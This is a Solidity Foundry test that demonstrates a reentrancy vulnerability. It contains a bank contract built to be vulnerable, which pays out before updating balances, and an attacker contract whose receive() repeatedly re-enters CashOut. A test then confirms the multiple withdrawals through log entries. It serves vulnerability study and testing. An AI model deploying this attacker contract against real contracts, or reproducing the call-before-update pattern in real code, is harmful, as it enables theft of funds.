// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

contract Log {
    struct Message {
        address Sender;
        uint Time;
        uint Val;
        string Data;
    }
    
    Message[] public History;
    
    function AddMessage(address _adr, uint _val, string memory _data) public {
        Message memory newMsg = Message(_adr, block.timestamp, _val, _data);
        History.push(newMsg);
    }
    
    // Added getter for History array length
    function getHistoryLength() public view returns (uint) {
        return History.length;
    }
}

contract Private_Bank {
    Log public TransferLog;
    mapping(address => uint) public balances;

    constructor(address _log) {
        TransferLog = Log(_log);
    }

    function Deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function CashOut(uint _am) public payable {
        if(_am <= balances[msg.sender]) {
            (bool success, ) = payable(msg.sender).call{value: _am}("");
            if(success) {
                unchecked {
                    balances[msg.sender] -= _am;
                }
                TransferLog.AddMessage(msg.sender, _am, "CashOut");
            }
        }
    }

    receive() external payable {}
}

contract MaliciousContract {
    Private_Bank private bank;
    uint public attackCount;
    uint public amount;

    constructor(Private_Bank _bank, uint _amount) {
        bank = _bank;
        amount = _amount;
    }

    function deposit() public payable {
        bank.Deposit{value: msg.value}();
    }

    function attack() public {
        bank.CashOut(amount);
    }

    receive() external payable {
        attackCount++;
        if (attackCount < 3) {
            bank.CashOut(amount);
        }
    }
}

contract PrivateBankTest is Test {
    Private_Bank private bank;
    MaliciousContract private attacker;
    Log private mockLog;
    uint private attackAmount = 1 ether;

    function setUp() public {
        mockLog = new Log();
        bank = new Private_Bank(address(mockLog));
        attacker = new MaliciousContract(bank, attackAmount);
        vm.deal(address(attacker), 10 ether);
    }

    function testReentrancyAttack() public {
        // Deposit funds from attacker
        vm.prank(address(attacker));
        attacker.deposit{value: attackAmount * 3}();

        // Capture initial state BEFORE attack
        console.log("------- BEFORE Attack -------");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackCountBefore = attacker.attackCount();
        uint256 logLengthBefore = mockLog.getHistoryLength(); // Fixed: use getter function
        
        console.log("Bank Balance:", bankBalanceBefore / 1e18, "ETH");
        console.log("Attacker Balance:", attackerBalanceBefore / 1e18, "ETH");
        console.log("Attack Count:", attackCountBefore);
        console.log("Log Entries:", logLengthBefore);

        // Execute attack
        console.log("------- TRIGGER: Start Attack -------");
        vm.prank(address(attacker));
        attacker.attack();
        console.log("------- AFTER Attack -------");

        // Capture state AFTER attack
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackCountAfter = attacker.attackCount();
        uint256 logLengthAfter = mockLog.getHistoryLength(); // Fixed: use getter function
        
        console.log("Bank Balance:", bankBalanceAfter / 1e18, "ETH");
        console.log("Attacker Balance:", attackerBalanceAfter / 1e18, "ETH");
        console.log("Attack Count:", attackCountAfter);
        console.log("Log Entries:", logLengthAfter);

        // Calculate state changes
        uint256 bankBalanceChange = bankBalanceBefore - bankBalanceAfter;
        uint256 attackerBalanceChange = attackerBalanceAfter - attackerBalanceBefore;
        uint256 logEntriesAdded = logLengthAfter - logLengthBefore;
        
        console.log("------- Differential Results -------");
        console.log("Bank Balance Change:", bankBalanceChange / 1e18, "ETH");
        console.log("Attacker Balance Change:", attackerBalanceChange / 1e18, "ETH");
        console.log("Log Entries Added:", logEntriesAdded);

        // Vulnerability verdict
        console.log("------- Vulnerability Verification -------");
        if (logEntriesAdded > 1) {
            console.log("Reentrancy Vulnerability CONFIRMED");
            console.log(">>> Multiple withdrawals detected via log entries");
            console.log("Vulnerability Exists: Reentrancy caused %d withdrawals in 1 transaction", logEntriesAdded);
        } else {
            console.log("No Exploitation DETECTED");
            console.log("Vulnerability not Exist: Contract is reentrancy-safe");
        }
    }
}